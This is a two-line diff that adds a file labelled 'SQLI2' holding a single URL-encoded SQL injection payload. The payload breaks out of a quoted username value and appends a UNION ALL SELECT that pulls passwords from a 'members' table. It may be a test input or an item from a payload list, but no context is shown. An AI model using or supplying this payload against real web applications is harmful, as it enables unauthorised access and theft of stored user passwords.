@@ -1,0 +1,2 @@
+SQLI2
+bellamond%27%20UNION%20ALL%20SELECT%20password,%20admin%20FROM%20members%20WHERE%20username%20LIKE%20%27bellamond%27;
